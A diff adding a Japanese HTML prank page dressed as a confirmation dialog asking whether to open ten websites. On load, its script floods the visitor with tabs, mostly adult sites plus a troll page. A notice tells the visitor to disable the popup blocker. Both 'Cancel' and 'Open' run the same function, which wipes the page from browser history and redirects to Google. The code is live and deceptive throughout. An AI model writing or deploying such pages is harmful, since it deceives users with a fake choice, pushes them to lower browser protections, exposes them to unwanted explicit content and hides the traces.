@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>確認</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      user-select: none;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
+      background: #121212;
+      background-image: radial-gradient(circle at center, #1a1e29 0%, #0a0c10 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .modal {
+      background: #f5f5f7;
+      width: 100%;
+      max-width: 520px;
+      border-radius: 20px;
+      padding: 32px 28px 28px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+      text-align: center;
+      color: #1d1d1f;
+      animation: modalFadeIn 0.25s ease-out;
+    }
+
+    @keyframes modalFadeIn {
+      from { opacity: 0; transform: scale(0.96); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    .modal-title {
+      font-size: 1.6rem;
+      font-weight: 700;
+      color: #1d1d1f;
+      margin-bottom: 20px;
+    }
+
+    .divider {
+      height: 1px;
+      background-color: #d2d2d7;
+      width: 100%;
+      margin-bottom: 28px;
+    }
+
+    .modal-body {
+      font-size: 1.1rem;
+      color: #3a3a3c;
+      line-height: 1.5;
+      margin-bottom: 32px;
+    }
+
+    .sub-notice {
+      margin-top: 10px;
+      font-size: 0.85rem;
+      color: #8e8e93;
+    }
+
+    .button-group {
+      display: flex;
+      gap: 16px;
+      width: 100%;
+    }
+
+    .btn {
+      flex: 1;
+      padding: 16px 0;
+      font-size: 1rem;
+      font-weight: 600;
+      border-radius: 12px;
+      cursor: pointer;
+      outline: none;
+      transition: all 0.15s ease;
+    }
+
+    .btn-secondary {
+      background: transparent;
+      border: 2px solid #3a3a3c;
+      color: #1d1d1f;
+    }
+    .btn-secondary:hover { background: rgba(0,0,0,0.05); }
+
+    .btn-primary {
+      background: #212529;
+      border: 2px solid #212529;
+      color: #ffffff;
+    }
+    .btn-primary:hover { background: #343a40; }
+  </style>
+</head>
+<body>
+
+  <div class="modal" id="modalBox">
+    <div class="modal-title">確認</div>
+    <div class="divider"></div>
+    <div class="modal-body">
+      10個のWebサイトを展開しますか？
+      <div class="sub-notice">※ポップアップブロックを解除すると自動で処理が完了します。</div>
+    </div>
+    <div class="button-group">
+      <button class="btn btn-secondary" onclick="executeDestruction()">キャンセル</button>
+      <button class="btn btn-primary" onclick="executeDestruction()">開く</button>
+    </div>
+  </div>
+
+  <script>
+    // ==========================================
+    // CONFIG: 設定項目
+    // ==========================================
+    const config = {
+      urls: [
+        "https://share.google/ZW8b2y6RtrhUb4k5I",
+        "https://share.google/ZW8b2y6RtrhUb4k5I",
+        "https://momon-ga.com",
+        "https://share.google/D64iKDN5pRXYZoMFg",
+        "https://pronhub.com",
+        "https://www.fanza.jp",
+        "https://dmm.co.jp",
+        "https://share.google/OuuuTcyFuxJFnDYvQ",
+        "https://share.google/l0QjHvn5DVueHAVGG",
+        "https://troll-tuna.github.io/troll/"
+      ],
+      redirectUrl: "https://www.google.com" // 隠滅・リダイレクト先のURL
+    };
+
+    // 1. ページを開いた瞬間に10個のタブを開こうとする（ここでポップアップブロックが発動する）
+    window.addEventListener('DOMContentLoaded', () => {
+      config.urls.forEach((url, index) => {
+        setTimeout(() => {
+          window.open(url, '_blank');
+        }, index * 100);
+      });
+    });
+
+    // 2. ユーザーがポップアップブロックを解除（許可）して、
+    // タブが一斉に開いたためにこのページがバックグラウンドに隠れた（隠滅タイミング）を検知
+    document.addEventListener("visibilitychange", () => {
+      if (document.visibilityState === "hidden") {
+        executeDestruction();
+      }
+    });
+
+    // 3. ボタンを押した場合、またはブロック解除を検知したときの完全隠滅 & リダイレクト処理
+    let isDestroyed = false;
+    function executeDestruction() {
+      if (isDestroyed) return;
+      isDestroyed = true;
+
+      // 履歴を上書きして直前の形跡を完全になくす
+      window.location.replace("about:blank");
+      
+      setTimeout(() => {
+        window.location.replace(config.redirectUrl);
+      }, 150);
+    }
+  </script>
+</body>
+</html>
